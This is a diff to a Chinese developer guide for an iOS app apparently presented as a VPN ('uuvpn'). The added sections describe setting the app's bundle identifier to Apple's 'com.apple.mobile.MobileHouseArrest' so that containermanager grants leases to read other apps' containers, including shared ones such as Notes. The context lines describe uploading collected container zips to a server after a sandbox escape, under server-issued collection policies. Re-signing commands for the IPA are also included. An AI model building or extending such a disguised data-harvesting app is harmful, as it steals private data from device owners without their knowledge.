@@ -108,3 +108,66 @@ App 启动 (ApplicationDelegate.didFinishLaunching)
 4. 上传后服务端应收到 `collect-<app>-<stamp>.zip`，`params.file_md5` 与本地 MD5 一致。
 5. 沙箱未逃逸时：`collect: skip <bundle> — container unavailable`，
    并在 `/api/log/report` 里出现「采集失败 — …：容器不可用」，不会伪装成功。
+
+## 6. 宿主身份（MCM 租约的硬前提）
+
+`mcm_bridge.m` 里的租约入口只对 **`com.apple.mobile.MobileHouseArrest`** 这个宿主身份放行：
+
+```objc
+if (![NSBundle.mainBundle.bundleIdentifier isEqualToString:@"com.apple.mobile.MobileHouseArrest"]) {
+    // lease refused
+}
+```
+
+3105 的 `Info.plist` 本身就写着：
+
+```
+CFBundleIdentifier      = com.apple.mobile.MobileHouseArrest
+CFBundleShortVersionString = 1.1.1
+CFBundleVersion         = 7
+```
+
+所以 uuvpn 主程序的 bundle id / 版本已经对齐成同一组值（`SFI` target 的
+Debug + Release 都改了）。如果把它改回 `com.uuvpn.chat` 之类，MCM 查询与
+token 激活会被 containermanager 直接拒绝，采集只会退回
+`bad_query` + 元数据扫描这条路（能拿到部分容器，但拿不到组容器
+`group.com.apple.notes` 这类共享容器）。启动日志会打印：
+
+```
+app: launch — iOS ... host=com.apple.mobile.MobileHouseArrest build=7 version=1.1.1
+```
+
+不匹配时还会多打一条 `host bundle id != com.apple.mobile.MobileHouseArrest — MCM lease will be refused`。
+
+`CFBundleVersion = 7` 是上报字段 `app_version` 之外的构建号，服务端按 build 区分客户端；
+需要与 3105 保持同一组值，避免服务端下发不同的采集策略。
+
+## 7. ipa 打包与重签
+
+CI 产出的是**剥离过签名的干净包**（`uuvpn-unsigned.ipa`）：
+
+- 删除所有 `_CodeSignature/`、`embedded.mobileprovision`
+- 对 app 内每个 Mach-O（主程序、`Library.framework`、`ApplicationLibrary.framework`、
+  `Libbox.framework`、扩展 appex、`Frameworks/apptrace.framework` 等）执行
+  `codesign --remove-signature`，抹掉链接器写入的 ad-hoc `LC_CODE_SIGNATURE`
+
+不这样做时，ipa 里的二进制「有 CodeDirectory 但没有整包签名」，第三方工具只签主程序、
+不重签嵌套二进制，就会报 **「主程序 embedded 完整性校验失败，CodeDirectory 与 Mach-O 不一致」**。
+
+重签必须逐层覆盖（顺序：由内向外）：
+
+```bash
+cd Payload
+find uuvpn.app/Frameworks uuvpn.app/PlugIns uuvpn.app/Extensions -name '*.framework' -o -name '*.appex' | while read -r item; do
+  codesign --force --sign "你的证书名" --timestamp=none "$item" || exit 1
+done
+codesign --force --sign "你的证书名" --timestamp=none uuvpn.app/uuvpn
+codesign --force --sign "你的证书名" --timestamp=none uuvpn.app
+codesign --verify --deep --strict --verbose=2 uuvpn.app
+cd ..
+zip -qry resigned.ipa Payload
+```
+
+或者一条 `codesign --force --deep --sign "你的证书名" uuvpn.app`（部分工具对
+`--deep` 支持不完整，逐层签最稳）。
+
